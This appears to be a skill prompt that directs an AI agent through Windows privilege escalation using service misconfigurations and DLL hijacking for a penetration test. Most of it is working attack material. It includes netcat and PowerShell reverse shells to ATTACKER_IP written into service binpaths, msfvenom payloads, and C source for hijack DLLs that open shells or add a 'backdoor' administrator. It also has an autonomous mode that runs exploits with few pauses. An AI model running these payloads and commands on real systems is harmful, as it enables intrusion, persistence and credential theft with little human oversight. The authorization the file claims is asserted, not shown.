---
name: windows-service-dll-abuse
description: >
  Exploit Windows service misconfigurations and DLL hijacking for local
  privilege escalation.
keywords:
  - unquoted service path
  - dll hijacking
  - service exploitation
  - writable service
  - dll search order
  - binpath
  - sc config
  - accesschk
tools:
  - accesschk
  - sc
  - PowerUp
  - Process Monitor
  - icacls
  - mingw (DLL compilation)
opsec: medium
---

# Windows Service Misconfiguration & DLL Hijacking

You are helping a penetration tester escalate privileges on a Windows system by
exploiting service misconfigurations and DLL hijacking. All testing is under explicit
written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Enumerate all vectors, exploit the most reliable one, verify
  escalation. Only pause before modifying critical system services.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[windows-service-dll-abuse] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
engagement state. The orchestrator maintains these files. Report all findings
in your return summary.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

**Do NOT write engagement state.** When your work is complete, report all
findings clearly in your return summary. The orchestrator parses your summary
and records state changes. Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Shell access on a Windows system
- Tools: `accesschk.exe` (Sysinternals), `sc.exe` (built-in), `icacls` (built-in)
- For DLL hijacking: ability to write files to target directories
- For DLL compilation: `mingw` cross-compiler (on attacker machine)

## Step 1: Enumerate Services

Get a full picture of the service landscape before checking for specific vulnerabilities.

**List all services:**

```cmd
sc query state= all
wmic service list brief
net start
tasklist /SVC
```

```powershell
Get-Service | Select-Object Name, Status, StartType | Sort-Object StartType
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName, StartName | Where-Object {$_.PathName -notlike "C:\Windows\System32\svchost*"} | Format-Table -AutoSize
```

**Non-default services (most likely to be misconfigured):**

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
```

**Service account context (what user does each service run as):**

```cmd
wmic service get name,startname,pathname | findstr /i /v "LocalSystem"
```

## Step 2: Unquoted Service Paths

When a service path contains spaces and isn't quoted, Windows tries intermediate
paths. For `C:\Program Files\Some App\service.exe`, Windows tries:
1. `C:\Program.exe`
2. `C:\Program Files\Some.exe`
3. `C:\Program Files\Some App\service.exe`

**Enumerate unquoted paths:**

```cmd
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
```

```powershell
# PowerUp
Get-ServiceUnquoted -Verbose

# Manual
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\Windows\*'} | Select-Object Name, PathName, StartMode
```

**Exploitation:**

1. Verify write access to one of the intermediate directories:
```cmd
icacls "C:\Program Files\Some App\"
accesschk.exe -dqv "C:\Program Files\Some App\"
```

2. Place a binary at the hijacked path:
```cmd
copy C:\temp\payload.exe "C:\Program Files\Some.exe"
```

3. Restart the service:
```cmd
sc stop <service_name>
sc start <service_name>
```

Or wait for system reboot if the service is set to auto-start.

**Generate payload:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o payload.exe
```

## Step 3: Weak Service Permissions

If a service's ACL allows non-admin users to modify it, you can change the binary
path to execute arbitrary commands.

**Enumerate modifiable services:**

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
```

**Vulnerable permissions:**
- `SERVICE_ALL_ACCESS` — full control
- `SERVICE_CHANGE_CONFIG` — can modify binpath
- `WRITE_DAC` — can modify service DACL
- `WRITE_OWNER` — can take ownership

**Check specific service:**

```cmd
accesschk.exe -ucqv <service_name> /accepteula
sc qc <service_name>
sc sdshow <service_name>
```

**Exploitation — change service binary path:**

```cmd
sc stop <service_name>
sc config <service_name> binpath= "C:\temp\nc.exe -nv ATTACKER_IP 4444 -e C:\WINDOWS\System32\cmd.exe"
sc start <service_name>
```

**Alternative — add local admin user:**

```cmd
sc config <service_name> binpath= "net user backdoor P@ssw0rd123 /add"
sc start <service_name>
sc config <service_name> binpath= "net localgroup administrators backdoor /add"
sc start <service_name>
```

**PowerUp automated exploit:**

```powershell
Invoke-ServiceAbuse -Name <service_name> -Command "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

**Writable service binary (direct replacement):**

```cmd
icacls "C:\Program Files\VulnApp\service.exe"
```

If `(M)` or `(F)` for your user/group, replace the binary directly:

```cmd
move "C:\Program Files\VulnApp\service.exe" "C:\Program Files\VulnApp\service.exe.bak"
copy C:\temp\payload.exe "C:\Program Files\VulnApp\service.exe"
sc stop <service_name>
sc start <service_name>
```

**Service registry ACL abuse:**

```powershell
get-acl HKLM:\System\CurrentControlSet\services\<service_name> | Format-List *
```

If writable, modify `ImagePath` directly:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<service_name>" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\payload.exe" /f
sc stop <service_name>
sc start <service_name>
```

## Step 4: Service Triggers

Some services can be started by low-privilege users via trigger events, even without
`SERVICE_START` permission.

**Enumerate triggers:**

```cmd
sc qtriggerinfo <service_name>
```

**Common trigger types and how to fire them:**

**Named Pipe trigger (connect to start service):**

```powershell
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', 'PipeNameFromTrigger', [System.IO.Pipes.PipeDirection]::InOut)
try { $pipe.Connect(1000) } catch {}
$pipe.Dispose()
```

**ETW trigger (e.g., WebClient service):**

```cmd
sc qtriggerinfo webclient
# Start WebClient by touching a WebDAV path
pushd \\attacker.com\share
popd
```

**RPC endpoint trigger:**

```bash
rpcdump.py @127.0.0.1 -uuid <INTERFACE-UUID-FROM-TRIGGER>
```

**Group Policy trigger:**

```cmd
gpupdate /force
```

**Combine with other vectors:** If you can write a DLL to a service's search path
but can't start the service, fire its trigger to load your DLL.

## Step 5: DLL Hijacking — Enumeration

DLL hijacking exploits the Windows DLL search order: when a process loads a DLL by
name (not absolute path), Windows searches directories in order.

### DLL Search Order (SafeDllSearchMode enabled — default)

1. Directory from which the application loaded
2. `C:\Windows\System32`
3. `C:\Windows\System` (16-bit legacy)
4. `C:\Windows`
5. Current working directory
6. Directories in the `PATH` environment variable

**KnownDLLs** (registered in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`)
always load from System32 — cannot be hijacked.

### Find Missing DLLs with Process Monitor

1. Open Process Monitor (Procmon.exe)
2. Add filters:
   - Process Name → contains → `<target_process>`
   - Result → is → `NAME NOT FOUND`
   - Path → ends with → `.dll`
3. Start capture, trigger the target process
4. Look for DLL load attempts with `NAME NOT FOUND` in writable directories

### Find Writable PATH Directories

```cmd
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

```powershell
$env:PATH -split ';' | ForEach-Object { if(Test-Path $_) { $acl = (icacls $_ 2>$null); if($acl -match '(F|M|W)') { Write-Host "$_ : $acl" } } }
```

### PowerUp DLL Hijacking Checks

```powershell
Find-PathDLLHijack
Find-ProcessDLLHijack
```

### Check Application Import Table

```cmd
dumpbin /imports "C:\path\to\application.exe"
```

Look for DLLs not in System32 or KnownDLLs — these are candidates for hijacking.

## Step 6: DLL Hijacking — Exploitation

### Basic DLL Payload

```c
// Compile: x86_64-w64-mingw32-gcc -shared -o hijack.dll payload.c
// For x86: i686-w64-mingw32-gcc -shared -o hijack.dll payload.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("C:\\temp\\nc.exe ATTACKER_IP 4444 -e cmd.exe");
    }
    return TRUE;
}
```

### DLL with Local Admin Creation

```c
// x86_64-w64-mingw32-gcc -shared -o hijack.dll payload.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

### DLL with Thread (Non-Blocking)

```c
// x86_64-w64-mingw32-gcc -shared -lws2_32 -o hijack.dll payload.c
#include <windows.h>

void Payload() {
    system("C:\\temp\\nc.exe ATTACKER_IP 4444 -e cmd.exe");
}

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Payload, 0, 0, 0);
    }
    return TRUE;
}
```

### DLL via MSFVenom

```bash
# x64 reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll

# x86 reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll

# Add user
msfvenom -p windows/adduser USER=backdoor PASS=P@ssw0rd123 -f dll -o hijack.dll
```

### DLL Proxying (Transparent Hijack)

Forward legitimate exports to the real DLL while executing payload. Use when the
application validates DLL exports.

**Tools:**
- DLLirant — generates proxy DLL source from legitimate DLL
- Spartacus — automated DLL hijacking helper

**Workflow:**
1. Identify target DLL loaded by privileged process
2. Generate proxy source with DLLirant/Spartacus
3. Add payload to `DllMain` or `DllRegisterServer`
4. Compile proxy DLL
5. Rename real DLL (e.g., `legit.dll` → `legit_orig.dll`)
6. Drop proxy as `legit.dll` — it forwards calls to `legit_orig.dll`

### COM DLL Hijacking

COM objects load DLLs from paths registered in the registry (`InprocServer32`).

```cmd
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"
```

If a COM object's `InprocServer32` points to a missing or writable DLL path, replace
it with a malicious DLL. COM objects loaded by scheduled tasks or services run as
the task/service account.

**Write to HKCU (no admin needed):**
```cmd
reg add "HKCU\Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32" /ve /d "C:\temp\hijack.dll" /f
reg add "HKCU\Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32" /v ThreadingModel /d "Both" /f
```

### Writable System PATH Directory

If you can write to a directory in the system PATH that's searched before the
legitimate DLL location:

```cmd
# Check which PATH directories are writable
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Drop a DLL with the same name as one loaded by a SYSTEM process. The next time
the process loads the DLL, it will find yours first.

### Exploitation Workflow

1. Identify target (missing DLL or writable DLL directory for privileged process)
2. Compile appropriate DLL payload (match architecture: x86 vs x64)
3. Drop DLL to target location
4. Trigger the DLL load:
   - Restart the service: `sc stop <svc> && sc start <svc>`
   - Fire service trigger (Step 4)
   - Wait for scheduled task / system reboot
   - Force GPUpdate: `gpupdate /force`
5. Verify escalation: check reverse shell or `net localgroup administrators`

## Step 7: Auto-Updater and IPC Abuse

Third-party software with local update mechanisms can be exploited for SYSTEM
code execution.

**Common patterns:**
- Localhost HTTP listeners (check `netstat -ano | findstr LISTENING`)
- Named pipes with weak ACLs
- IPC channels accepting commands from any local user

**Enumeration:**

```cmd
netstat -ano | findstr LISTENING | findstr 127.0.0.1
```

Look for non-standard ports. Research the application associated with each PID:

```cmd
tasklist /FI "PID eq <pid>"
```

**Exploitation approach:**
1. Identify the IPC protocol (HTTP, named pipe, TCP socket)
2. Research the application for known CVEs or command injection
3. Test for origin validation bypass (e.g., `Host: trusted.vendor.com.attacker.tld`)
4. Forge enrollment/update commands to trigger malicious payload installation

Route to **Deep Reference** for specific vendor CVEs and IPC exploitation techniques.

## Step 8: Escalate or Pivot

### Reverse Shell via MCP

When service/DLL abuse achieves SYSTEM execution, **catch the SYSTEM shell via
the MCP shell-server** rather than relying on local admin user creation or
interactive console access. Service restarts and DLL loads execute in a
different session -- a reverse shell catches the SYSTEM callback directly.

1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
2. Use a reverse shell as the service binpath or DLL payload:
   ```cmd
   :: Service binpath modification:
   sc config <service_name> binpath= "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
   :: Or via nc.exe in service binpath:
   sc config <service_name> binpath= "C:\temp\nc.exe ATTACKER PORT -e cmd.exe"
   ```
   For DLL hijacking, compile the DLL with a reverse shell in `DllMain`
   (see Step 6 payloads) pointing at the shell-server listener.
3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
4. Verify the new privilege level with `send_command(session_id=..., command="whoami")`

If the target lacks outbound connectivity, use the `net user` add-admin
approach and interact through an existing session, or use a bind shell DLL.

After achieving elevated access via service or DLL abuse:

- **SYSTEM access achieved**: Route to **windows-credential-harvesting** for credential
  extraction, or **credential-dumping** if domain-joined
- **New service account (not SYSTEM)**: Check new account's privileges with
  `whoami /priv` — may enable **windows-token-impersonation**
- **DLL hijack in user context**: Use for persistence or lateral movement rather
  than direct privilege escalation

When routing, pass along: hostname, access level achieved, exploitation method used,
OS version, current mode.

Update `engagement/state.md` with escalation results.

## Stall Detection

If you have spent **5 or more tool-calling rounds** on the same failure with
no meaningful progress — same error, no new information, no change in output
— **stop**.

**What counts as progress:**
- Trying a variant or alternative **documented in this skill**
- Adjusting syntax, flags, or parameters per the Troubleshooting section
- Gaining new diagnostic information (different error, partial success)

**What does NOT count as progress:**
- Writing custom exploit code not provided in this skill
- Inventing workarounds using techniques from other domains
- Retrying the same command with trivially different input
- Compiling or transferring tools not mentioned in this skill

If you find yourself writing code that isn't in this skill, you have left
methodology. That is a stall.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing works after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Return findings to the orchestrator. Do not retry the same
  technique — the orchestrator will decide whether to revisit with new context
  or route elsewhere.

## Troubleshooting

### "Access denied" when modifying service
Your user doesn't have `SERVICE_CHANGE_CONFIG` on this service. Check with
`accesschk.exe -ucqv <service_name>`. Try other services or different vectors.

### Service won't restart after modification
Some services fail to start with modified binpath (wrong return code, crash).
Use `binpath= "cmd.exe /c <payload>"` or create a wrapper that executes the
payload then exits cleanly.

### DLL architecture mismatch
32-bit process loads 32-bit DLLs, 64-bit loads 64-bit. Check with `tasklist /v`
or `file <binary>`. Compile with matching mingw:
`i686-w64-mingw32-gcc` (x86) vs `x86_64-w64-mingw32-gcc` (x64).

### DLL is in KnownDLLs — can't hijack
DLLs registered in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`
always load from System32. Target a different DLL loaded by the same process, or
use DLL side-loading (place signed EXE + malicious DLL in writable directory).

### Process Monitor not available
Use PowerUp's `Find-PathDLLHijack` and `Find-ProcessDLLHijack` as alternatives.
Or check PATH directory permissions manually and cross-reference with service
binary imports (`dumpbin /imports`).

### Service runs but payload doesn't execute
DLL's `DllMain` may not be reached if the application loads it via `LoadLibraryEx`
with `LOAD_LIBRARY_AS_DATAFILE`. In that case, the DLL must export a function
the application calls — use DLL proxying to ensure export compatibility.
